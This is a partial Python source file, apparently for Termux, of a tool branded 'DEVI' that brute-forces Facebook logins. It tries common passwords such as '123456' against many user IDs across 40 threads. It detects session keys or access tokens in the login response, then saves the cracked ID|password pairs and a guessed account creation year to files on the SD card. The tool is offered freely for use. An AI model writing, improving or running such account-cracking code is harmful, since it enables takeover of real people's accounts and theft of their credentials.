...
sys.stdout.write('\x1b]2; DEVI  \x07')

def request_storage_permission():
    try:
        open('/sdcard/@DEVI', 'w').write(' ')
    except Exception as e:
        print(e)
        print('\x1b[1;93m Allow Termux Permissions! And Run Again ')
        os.system('termux-setup-storage')

directories = ['/sdcard/DEVI', '/sdcard/DEVI-DEVI', '/sdcard/DEVI/DEVI-DEVI']
...
def Banner():
    if 'Linux' in sys.platform.capitalize():
        os.system('clear')
        os.system("https://www.facebook.com/profile.php?id=61578248083866")
      
    else:
        os.system('cls')
    return '\n   \x1b[38;5;196m ██████╗ ███████╗██╗   ██╗██╗ \n\x1b[33;46m██╔══██╗██╔════╝██║   ██║██║ \n\x1b[33;1m ██║  ██║█████╗  ██║   ██║██║ \n\x1b[33;47m██║  ██║██╔══╝  ╚██╗ ██╔╝██║ \n \x1b[33;1m██████╔╝███████╗ ╚████╔╝ ██║ \n   \x1b[33;96m╚═════╝ ╚══════╝  ╚═══╝  ╚═╝ \n\x1b[38;5;46m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n   \x1b[1;91m[\x1b[1;35m≋\x1b[1;91m] \x1b[1;92m Maker\x1b[1;91m :   \x1b[1;92DEVIEVI KING\n   \x1b[1;91m[\x1b[1;35m≋\x1b[1;91m] \x1b[1;92mFACEBOOK \x1b[1;91m  :   \x1b[1;92DEVIEVI ONFIRE ☠🚩\n   \x1b[1;91m[\x1b[1;35m≋\x1b[1;91m] \x1b[1;92mSTATUS\x1b[1;91m :   \x1b[1;92mFREE\n   \x1b[1;91m[\x1b[1;35m≋\x1b[1;91m] \x1b[1;92mVERSION \x1b[1;91m   :   \x1b[1;92m12.8\n   \x1b[38;5;46m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n'
os.system('clear')

def creationyear(uid):
    if len(uid) == 15:
        if uid[:10] in ('1000000000',): DEVI_dgk = '2009'
        elif uid[:9] in ('100000000',): DEVI_dgk = '2009'
        elif uid[:8] in ('10000000',): DEVI_dgk = '2009'
        elif uid[:7] in ('1000000', '1000001', '1000002', '1000003', '1000004', '1000005'): DEVI_dgk = '2009'
        elif uid[:7] in ('1000006', '1000007', '1000008', '1000009'): DEVI_dgk = '2010'
        elif uid[:6] in ('100001',): DEVI_dgk = '2010'
        elif uid[:6] in ('100002', '100003'): DEVI_dgk = '2011'
        elif uid[:6] in ('100004',): DEVI_dgk = '2012'
        elif uid[:6] in ('100005', '100006'): DEVI_dgk = '2013'
        elif uid[:6] in ('100007', '100008'): DEVI_dgk = '2014'
        elif uid[:6] in ('100009',): DEVI_dgk = '2015'
        elif uid[:5] in ('10001',): DEVI_dgk = '2016'
        elif uid[:5] in ('10002',): DEVI_dgk = '2017'
        elif uid[:5] in ('10003',): DEVI_dgk = '2018'
        elif uid[:5] in ('10004',): DEVI_dgk = '2019'
        elif uid[:5] in ('10005',): DEVI_dgk = '2020'
        elif uid[:5] in ('10006',): DEVI_dgk = '2021'
        elif uid[:5] in ('10009',): DEVI_dgk = '2023'
        elif uid[:5] in ('10007', '10008'): DEVI_dgk = '2022'
        else: DEVI_dgk = ''
    elif len(uid) in (9, 10): DEVI_dgk = '2008'
    elif len(uid) == 8: DEVI_dgk = '2007'
    elif len(uid) == 7: DEVI_dgk = '2006'
    elif len(uid) == 14 and uid[:2] in ('61',): DEVI_dgk = '2024'
    else: DEVI_dgk = ''
    return DEVI_dgk

def ua2():
    rr = random.randint
    aZ = random.choice('ABCDEFGHIJKLMNOPQRSTUVWDEVI')
    ...
    try:
        ...
        for pw in ['123456', '1234567', '12345678', '123456789', '111111', '000000', '654321', '1234567890']:
            ...
            if 'session_key' in response or 'EAAA' in str(response):
                with open('/sdcard/DEVI_old.txt', 'a') as file:
                    file.write(f'[DEVI-OK☠] {uid}|{pw}|{creationyear(uid)}')
                line()
                print(f'\r{xy1}{G} [DEVI-OK☠] {uid} | {pw} | {creationyear(uid)}')
                ProfileLink = f'https://www.facebook.com/profile.php?id={uid}'
                print(f'\r{x}{R} LINK {G}➤{G} {ProfileLink}')
                line()
                open('/sdcard/DEVI/OLD-UID/DEVI_old_uid_ok.txt', 'a').write(f'[DEVI-OK] {uid} | {pw} | {creationyear(uid)}\n')
                ...
                print(f'\r{xy1}{G} [DEVI-OK☠] {uid} | {pw} | {creationyear(uid)}')
                ProfileLink = f'https://www.facebook.com/profile.php?id={uid}'
                print(f'\r{xy1}{R}  LINK {G}➤{G} {ProfileLink}')
                line()
                successfull.append(str(uid) + '|' + str(pw))
                break
...
def main():
    ...
    with ThreadPool(max_workers=40) as pool:
        pool.map(login, [DEVI + uid for uid in user_ids])
    print()
    line()
